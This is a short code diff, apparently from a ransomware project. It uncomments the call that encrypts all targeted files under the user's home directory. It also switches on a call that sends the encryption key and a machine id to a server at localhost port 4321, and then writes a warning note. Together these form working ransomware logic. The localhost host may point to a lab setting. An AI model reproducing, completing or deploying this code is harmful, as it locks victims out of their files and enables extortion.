@@ -32,6 +32,9 @@ from encrypter import encrypt_files, gen_key, get_fernet
 from file_scanner import IGNORE_DIRS, TARGET_FILES, get_all_files
 from utils import gen_machine_id, send_key, save_warning_text
 
+SERVER_HOST = "localhost"
+PORT = 4321
+
 target_path = Path.home()
 
 key = gen_key()
@@ -39,7 +42,7 @@ fernet = get_fernet(key)
 machine_id = gen_machine_id()
 
 files = get_all_files(target_path, TARGET_FILES, IGNORE_DIRS)
-# encrypt_files(fernet, files)
+encrypt_files(fernet, files)
 
-# send_key("", key, machine_id)
+send_key(f"http://{SERVER_HOST}:{PORT}", key, machine_id)
 save_warning_text(machine_id)
